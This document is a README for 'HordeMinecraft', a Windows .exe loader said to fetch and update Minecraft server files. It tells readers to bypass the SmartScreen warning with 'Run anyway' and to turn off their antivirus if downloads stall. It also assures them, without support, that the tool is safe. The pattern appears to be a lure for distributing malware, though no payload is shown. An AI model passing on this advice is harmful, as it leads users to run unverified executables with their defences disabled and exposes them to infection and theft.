HordeMinecraft helps you manage your Minecraft server files. If you run a server, you know how hard it can be to fetch the correct launcher files and keep them updated. This application automates those steps. It ensures you have the exact build you need to start your server without manual searching or configuration.

## ⚙️ System Requirements

Before you start, check that your computer meets these requirements:

*   **Operating System**: Windows 10 or Windows 11.
*   **Memory**: At least 4 gigabytes of RAM.
*   **Storage**: 500 megabytes of free space for the loader and server files.
*   **Software**: Java Runtime Environment (JRE) version 17 or higher. If you do not have Java, download it from the official Oracle or Adoptium website.

## 🚀 Setting Up Your Server

After you download the file, move it into an empty folder. This folder serves as the home for your entire server installation.

1.  Open the folder containing the downloaded file.
2.  Double-click the .exe file to run it.
3.  Windows might show a blue window labeled "Windows protected your PC." This happens because the file comes from the internet. Click "More info" and then click "Run anyway" to allow the loader to start.
4.  A window will appear and show the progress of the download. The loader fetches the necessary components for your server build automatically.
5.  Wait for the progress bar to finish. Do not close the window while the loader works.
6.  Once the process ends, the window will show a success message. You can now close the loader.

## 🛠 Using the Loader

The loader created several new files in your folder. You should see a start script or an executable file now. Double-click this to launch your server. 

The first time you run the server, you must agree to the user agreement file named eula.txt. Open this file in Notepad, change the line "eula=false" to "eula=true," and save the file. Run the server again to complete the setup. Once the server registers the change, it begins the final installation of assets.

## 📁 Troubleshooting Common Issues

If the loader fails to open or stops during the download, check these common items:

*   **Internet Connection**: Ensure you have a stable connection. The loader needs to connect to official servers to grab the build files.
*   **Antivirus Software**: Some security programs block background downloads. If the loader freezes, turn off your antivirus temporarily to see if it allows the process to finish.
*   **Java Path**: If the loader mentions it cannot find Java, ensure you installed the latest version. Restart your computer after installing Java to update your system paths.
*   **File Permissions**: Run the loader from a folder in your Documents or on your Desktop. Avoid placing the loader in protected folders like C:\Program Files, as these require administrator rights to write new files.

## 🛡 Security and Privacy

This loader only touches the files inside the folder where you place it. It does not look at your other files or share your personal information. It uses encrypted connections to download server files. This ensures that the files arriving on your computer match the official versions provided by the software maintainers. 

The tool does not require constant internet access once the initial download finishes. You can run your server offline once the loader completes its task. To update, simply download the latest version of the loader and run it again in the same folder. It will detect your existing files and pull only the updates required to keep your server running the newest build.
